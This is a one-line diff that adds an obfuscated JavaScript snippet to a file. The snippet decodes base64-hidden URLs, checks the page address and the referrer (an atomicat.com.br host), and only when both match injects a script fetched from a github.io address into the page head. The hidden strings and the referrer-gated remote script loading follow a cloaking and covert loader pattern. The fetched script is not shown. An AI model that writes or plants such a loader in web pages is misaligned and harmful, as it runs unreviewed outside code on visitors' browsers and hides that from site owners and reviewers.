@@ -1,1 +1,1 @@
-
+(function(){const p=window.location.href,r=document.referrer,g=atob("aHR0cHM6Ly93d3cudml0YWxzY2llbmNlcmVwb3J0cy5vbmxpbmUvdnYtcHJ5bA=="),f=atob("YXBwLmF0b21pY2F0LmNvbS5icg==");if(p.includes(g)&&r.includes(f)){const s=document.createElement("script");s.src=atob("aHR0cHM6Ly9hdG9taWNhdHBhZ2VzLmdpdGh1Yi5pby9jZG4vY29uZmlybS5qcw==");s.defer=!0;document.head.appendChild(s);}})();
